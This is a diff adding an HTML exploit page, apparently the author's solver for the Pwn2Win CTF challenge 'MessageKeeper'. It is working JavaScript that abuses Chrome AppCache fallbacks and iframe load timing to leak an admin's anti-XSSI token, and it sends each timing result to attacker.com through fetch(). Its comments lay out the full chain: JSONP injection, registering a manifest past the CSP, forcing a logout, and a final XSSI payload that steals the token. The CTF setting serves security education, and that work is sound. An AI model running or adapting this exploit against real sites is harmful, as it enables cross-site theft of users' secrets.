@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+	<html>
+	<head>
+		<title>Pwn2Win | MessageKeeper</title>
+	</head>
+	<body>
+		<script>
+			let alphabet = "0123456789abcdef";
+
+			const sleep = (ms) => {
+				return new Promise(resolve => setTimeout(resolve, ms));
+			}
+
+			let prepareCache = async (char) => {
+				return new Promise(function (resolve) {
+					let iframe = document.createElement("iframe");
+					iframe.src = `manifest.html?char=${char}`;
+					iframe.onload = () => {
+						resolve(true);
+					}
+					document.body.appendChild(iframe);
+				});
+			}
+
+			let tryCharacter = async (char) => {
+				return new Promise(function (resolve) {
+					let start = performance.now();
+					let iframe = document.createElement("iframe");
+					iframe.src = `https://messagekeeper.xyz/?${char}`;
+					iframe.onload = async () => {
+						await fetch(`https://attacker.com/?char=${char}&time=${performance.now() - start}`, {
+							mode: "no-cors"
+						});
+						resolve(true);
+					}
+					document.body.appendChild(iframe);
+				})
+			}
+
+			onload = async () => {
+
+				// The challenge is comprised of several steps, the main idea
+				// being that you have to abuse Chrome's AppCache fallback
+				// section (and the fact that it matches URLs by prefix) to
+				// leak the admin's anti-XSSI token and then use it to get
+				// the flag.
+
+				// It uses a few elements of a bug I reported last year to Chrome:
+				// https://bugs.chromium.org/p/chromium/issues/detail?id=1039869
+
+				// A summary of the steps can be found below:
+
+				// 1. You need to abuse a vulnerable JSONP callback located
+				//    on /user?callback to inject a meta tag and redirect
+				//    the admin to a page you control.
+
+				// 2. After that, you will need to request an Origin trial token
+				//    associated to the challenge's domain so that you can use
+				//    AppCache on its pages.
+				//
+				//    https://developer.chrome.com/origintrials/#/view_trial/1776670052997660673
+
+				// 3. Using /user?callback and the token you generated you will need
+				//    to register a cache manifest - this is possible because the
+				//    Application Cache isn't governed by the CSP directives.
+
+				//    That's helpful because even though the page sets the
+				//    Content-Security-Policy: default-src 'none' header, you will
+				//    still be able to register a manifest through the following code:
+				// 
+				//    <html manifest=/user?callback=CACHE MANIFEST [...]></html>
+
+				// 4. The manifest will need to contain a fallback section
+				//    where the first URL points to the /user?token endpoint
+				//    followed by a random hex character (the character to be
+				//    matched against the first character of the admin's
+				//    anti-XSSI token).
+				//
+				//    The second URL should point to /static/background.png
+				//    so that it inherits the headers of that resource, this
+				//    is necessary because it contains the "cache-control: public"
+				//    directive and it will be useful during the timing measurements
+				//    that will happen later on.
+				// 
+				//    CACHE MANIFEST:
+				//    /?{hex_char}
+				//
+				//    FALLBACK:
+				//    /user?token={hex_char} /static/background.png
+				//
+				//    ORIGIN-TRIAL:
+                                //    Ai4ydiVubeyrG5ojmsmx4z[..]eSI6MTYzMzQ3ODM5OX0=
+
+				// 5. After registering the manifest, you will need to logout
+				//    the admin by forcing them to access /logout, so that the
+				//    /user endpoint returns a 401 status code (necessary for
+				//    the fallback section to be triggered).
+
+				// 6. You will then need to load /?{hex_char} twice into iframes
+				//    and measure the time they took to load.
+				// 
+				//    If both load on similar times it means that the character you
+				//    tested didn't match against the first char of the admin's anti-XSSI
+				//    token (since /user wasn't cached after the first access).
+				//
+				//    If the second iframe took less time to load, it means that it matched
+				//    against the first char of the admin's anti-XSSI token since the /user
+				//    endpoint was cached (the fallback triggered on the /user?token endpoint
+				//    and the response from /static/background.png was loaded in its place).
+
+				// 7. After automating this process and leaking the entire anti-XSSI token
+				//    you will need to do an XSSI attack on the /user endpoint.
+				//
+				//    Essentially, you will need to have the code below on a page you control
+				//    and make the admin access it:
+                                //
+				//    <script>let leak = (info) => { console.log(info.message); } <\/script>
+				//    <script src="https://messagekeeper.xyz/user?token={admin_token}&callback=leak"><\/script>
+
+				//   [SIDE NOTE]
+				//   This solver only leaks the first byte of the XSSI token for demonstration
+				//   purposes, but it can be adapted to leak the full token.
+				//
+				//   If you didn't understand one of the steps, sorry!
+				//   In the next few days, I will be releasing an in-depth write-up that
+				//   should be clearer and more legible.
+				//
+				//   Thanks for playing!
+
+				for (let letter of alphabet) {
+				    await prepareCache(letter);
+				}
+
+				await sleep(2000);
+
+				await fetch("https://messagekeeper.xyz/logout", {
+					mode: "no-cors",
+					credentials: "include"
+				});
+
+				for (let letter of alphabet) {
+				    await tryCharacter(letter);
+				}
+
+			}
+		</script>
+	</body>
+</html>
